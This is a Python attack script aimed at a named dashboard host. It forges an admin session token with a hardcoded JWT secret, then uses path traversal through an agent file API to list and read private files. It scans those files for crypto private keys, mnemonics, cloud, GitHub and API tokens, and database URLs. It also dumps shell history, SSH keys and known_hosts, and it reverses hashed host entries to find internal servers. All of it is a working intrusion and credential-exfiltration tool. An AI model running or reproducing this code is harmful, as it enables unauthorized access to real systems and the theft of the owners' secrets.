#!/usr/bin/env python3
import os, sys, json, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
AID = "agent-047f1d22"
K = "/home/lumii/.lumii-agent-keeper/.."

OUT = []          # (key, str)
EMITTED = [0]
MAXTOTAL = 1100000

def emit(key, text, cap=30000):
    if not isinstance(text, str):
        text = json.dumps(text, ensure_ascii=False)
    for i in range(0, len(text), cap):
        if EMITTED[0] >= MAXTOTAL:
            OUT.append((key + "_TRUNC%d" % i, "[budget exceeded]"))
            return
        piece = text[i:i+cap]
        OUT.append(("%s#%d" % (key, i // cap), piece))
        EMITTED[0] += len(piece)

def sh(a, timeout=90):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=60):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

TOK = forge({"userId": "fc7c3730-4219-11f1-ac43-525400595be1", "email": "p@x", "customer": "aro", "role": "admin"})

def call(path, timeout=90, maxlen=9000000):
    a = ["--http2", "-A", UA, "-H", "Accept: application/json", "-H", "Cookie: session=" + TOK,
         "-w", "\n__CODE__%{http_code}", "https://%s%s" % (HOST, path)]
    rc, out, err = curl(a, timeout=timeout)
    i = out.rfind("__CODE__")
    code = ""
    txt = out
    if i >= 0:
        code = out[i+8:].strip()[:3]
        txt = out[:i]
    return {"code": code, "body": txt[:maxlen], "err": err[:300] if not out else ""}

def ls(rel):
    r = call("/api/agents/%s/files?action=list&path=%s" % (AID, up.quote(K + rel, safe="/")))
    ents = None
    try:
        ents = json.loads(r["body"]).get("entries")
    except Exception:
        pass
    return {"code": r["code"], "entries": ents, "raw": r["body"][:400] if ents is None else ""}

def rd(rel):
    r = call("/api/agents/%s/files?action=read&path=%s" % (AID, up.quote(K + rel, safe="/")))
    c = None
    meta = {}
    try:
        j = json.loads(r["body"])
        c = j.get("content")
        meta = {"size": j.get("size"), "modified": j.get("modified"), "err": j.get("error")}
    except Exception:
        meta = {"parse_err": r["body"][:200]}
    return {"code": r["code"], "content": c, "meta": meta}

PATS = [
    ("PRIV0xC56f", r"0xC56f7063fd6d199ccc443dbbf4283be602d46343", re.I),
    ("PRIV0xFE18", r"0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6", re.I),
    ("PRIV64", r"0x[0-9a-fA-F]{64}"),
    ("keystore", r"keystore|cipherparams|scrypt|pbkdf2", re.I),
    ("bip39", r"BIP39|mnemonic|助记词"),
    ("pem", r"-----BEGIN [A-Z0-9 ]+-----"),
    ("jwt", r"JWT_SECRET|LUMII_[A-Z_]*SECRET|SECRET_KEY|AUTH_SECRET"),
    ("dsn", r"DATABASE_URL|postgres://|postgresql://|mysql://|redis://|mongodb://|DATABASE_URI|PG_DSN"),
    ("zoofi", r"zoofi-index|zoofi|ZOOFI|wandfi|wand-index|index origin"),
    ("tunnel", r"cloudflared|rathole|tunnel[ _-]?token|frp[s]?://"),
    ("cloudak", r"AKID[A-Za-z0-9]{8,}|LTAI[A-Za-z0-9]{10,}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}"),
    ("ghtok", r"ghp_[A-Za-z0-9]{20,}|gho_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|ghs_[A-Za-z0-9]{20,}"),
    ("docker", r"dckr_pat_[A-Za-z0-9_\-]{10,}"),
    ("apikey", r"\bsk-[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_\-]{30,}"),
    ("privword", r"private[_ -]?key|PRIVATE KEY|私钥|ed25519|mnemonic"),
]

def grep(content, max_hits=14, ctx=140):
    hits = []
    for label, pat, flags in PATS:
        try:
            for m in re.finditer(pat, content, flags):
                s = max(0, m.start() - ctx); e = min(len(content), m.end() + ctx)
                hits.append({"pat": label, "pos": m.start(), "snip": content[s:e].replace("\n", "\\n")[:380]})
                if len(hits) >= max_hits:
                    return hits
        except Exception:
            pass
    return hits

RISK_EXT = (".jsonl", ".json", ".txt", ".md", ".log", ".sh", ".yml", ".yaml", ".toml", ".env", ".ini", ".conf", ".cfg", ".xml", ".csv")
def wanted(name, size):
    n = name.lower()
    if n.startswith(".env") or ".env." in n or n.endswith(".env"):
        return True
    return n.endswith(RISK_EXT)

def process_dir(rel, tag, max_files=60, max_bytes=2600000, dump_small=0):
    inv = []; hitrep = []; read_bytes = 0
    L = ls(rel)
    ents = L.get("entries") or []
    files = [e for e in ents if e.get("type") == "file"]
    dirs = [e for e in ents if e.get("type") == "directory"]
    for d in dirs[:40]:
        inv.append({"d": d.get("name")})
    files.sort(key=lambda x: -(x.get("size") or 0))
    cnt = 0
    for f in files:
        nm = f.get("name") or ""; sz = f.get("size") or 0
        inv.append({"f": nm, "s": sz, "m": f.get("modified")})
        if cnt >= max_files or read_bytes >= max_bytes or sz > 900000:
            continue
        if not wanted(nm, sz):
            continue
        cnt += 1
        sub = rel.rstrip("/") + "/" + nm
        R = rd(sub)
        c = R.get("content")
        if c is None:
            hitrep.append({"file": sub, "code": R["code"], "read_err": R["meta"]})
            continue
        read_bytes += len(c)
        h = grep(c)
        rec = {"file": sub, "size": len(c), "hits": len(h)}
        if h:
            rec["hitlist"] = h
        if dump_small and len(c) <= dump_small:
            emit("%s_FULL_%s" % (tag, re.sub(r'[^A-Za-z0-9._-]', '_', nm))[:60], c)
        hitrep.append(rec)
    emit("INV_" + tag, {"ls_code": L["code"], "ls_raw": L.get("raw"), "entries": inv})
    emit("GREP_" + tag, hitrep)

def kh_reverse(content):
    parsed = []
    for l in content.splitlines():
        if not l.startswith("|1|"):
            continue
        p = l.split()
        if len(p) < 2:
            continue
        try:
            _, _, salt_b, h_b = p[0].split("|")
            parsed.append((base64.b64decode(salt_b), base64.b64decode(h_b), l))
        except Exception:
            pass
    cands = []
    for i in list(range(1, 25)):
        cands += ["lumii%d" % i, "lumii-%d" % i]
    cands += ["lumii", "lumii-prod", "lumii-stage", "lumii3", "lumii4", "lumii5", "lumii6", "lumii-hk",
              "lumii-ai", "host.docker.internal", "github.com", "172.31.18.3", "relay.lumii-ai.cn",
              "dashboard.lumii-ai.cn", "assistant.lumii.ai", "localhost"]
    for a in range(0, 32):
        for b in range(1, 255):
            cands.append("172.31.%d.%d" % (a, b))
    for a in range(1, 255):
        cands.append("172.17.0.%d" % a)
        cands.append("172.22.0.%d" % a)
        cands.append("10.0.0.%d" % a)
        cands.append("192.168.1.%d" % a)
    found = []
    for salt, hb, line in parsed:
        for cd in cands:
            if hmac.new(salt, cd.encode(), hashlib.sha1).digest() == hb:
                parts = line.split()
                found.append({"host": cd, "keytype": parts[1] if len(parts) > 1 else "",
                              "keyhead": (parts[2] if len(parts) > 2 else "")[:60]})
                break
    return {"lines": len(parsed), "found": found}

def main():
    # sanity
    emit("META", {"me": call("/api/me")["code"], "root": ls("/")["code"]})

    # ① .claude transcripts
    process_dir("/.claude/projects/-home-coder--lumii-runtime-home", "RUNTIME_HOME")
    process_dir("/.claude/projects/-home-coder--lumii-runtime-stage-home", "RUNTIME_STAGE")
    process_dir("/.claude/projects/-home-coder", "CODER")
    process_dir("/.claude/projects/-home-coder-lumii-work", "LUMIIWORK")
    process_dir("/.claude/projects/-run-lumii-cc-3f016733-51da-4cfa-be26-26ebe214ec37-cwd", "RUNCC")
    process_dir("/.claude/file-history/dbf4456d-2dfb-49b3-a174-16fdd51044ed", "FILEHIST", dump_small=24000)
    process_dir("/.claude/file-history/23d59773-2ba1-4695-83c4-0331aadd6001", "FILEHIST2", dump_small=24000)

    # ② gstack
    process_dir("/.gstack/projects/aro-network-lumii-work", "GSTACK", dump_small=24000)

    # ③ Documents
    process_dir("/Documents", "DOCS", dump_small=20000)

    # .gnupg private-keys listing
    emit("GPG_LIST", ls("/.gnupg/private-keys-v1.d"))

    # .bash_history full
    R = rd("/.bash_history")
    if R.get("content"):
        emit("FULL_bash_history", R["content"])
        emit("GREP_bash_history", grep(R["content"], max_hits=20))

    # ④ known_hosts full + reverse
    R = rd("/.ssh/known_hosts")
    if R.get("content"):
        emit("FULL_known_hosts", R["content"])
        emit("KH_REV", kh_reverse(R["content"]))
    for extra in ["/.ssh/config", "/.ssh/id_ed25519", "/.ssh/authorized_keys"]:
        R = rd(extra)
        emit("FULL_" + re.sub(r'[^A-Za-z0-9]', '_', extra), {"code": R["code"], "meta": R["meta"], "content": R["content"]})

    # repos: root listing + .git/config + README + deploy
    for repo in ["/lumii-assistant", "/lumii-goldenyears-agent", "/lumii-sandbox"]:
        tag = repo.strip("/").replace("-", "_").upper()
        emit("INV_ROOT_" + tag, ls(repo))
        R = rd(repo + "/.git/config")
        emit("FULL_gitcfg_" + tag, {"code": R["code"], "content": R.get("content")})
        for f in ["/README.md", "/README_EN.md", "/.env.example", "/.env.dev.example", "/deploy/README.md"]:
            R = rd(repo + f)
            if R.get("content"):
                emit("FULL_%s%s" % (tag, re.sub(r'[^A-Za-z0-9]', '_', f)), R["content"])
                emit("GREP_%s%s" % (tag, re.sub(r'[^A-Za-z0-9]', '_', f)), grep(R["content"]))
        d = ls(repo + "/deploy")
        emit("INV_deploy_" + tag, d)
        for e in (d.get("entries") or [])[:25]:
            if e.get("type") != "file":
                continue
            nm = e.get("name") or ""
            if (e.get("size") or 0) > 80000:
                continue
            R = rd(repo + "/deploy/" + nm)
            c = R.get("content")
            if c is None:
                continue
            emit("GREP_deploy_%s_%s" % (tag, re.sub(r'[^A-Za-z0-9]', '_', nm))[:70], {"file": nm, "hits": grep(c)})
            if len(c) <= 16000 and (nm.lower().endswith((".sh", ".env", ".example", ".yml", ".yaml", ".md", ".toml", ".tf", ".conf"))):
                emit("FULL_deploy_%s_%s" % (tag, re.sub(r'[^A-Za-z0-9]', '_', nm))[:60], c)

try:
    main()
except Exception:
    import traceback
    emit("FATAL", traceback.format_exc()[-3000:])
finally:
    for k, v in OUT:
        print("R:%s:%s" % (k, base64.b64encode(v.encode("utf-8", "replace")).decode()), flush=True)
    sys.exit(0)
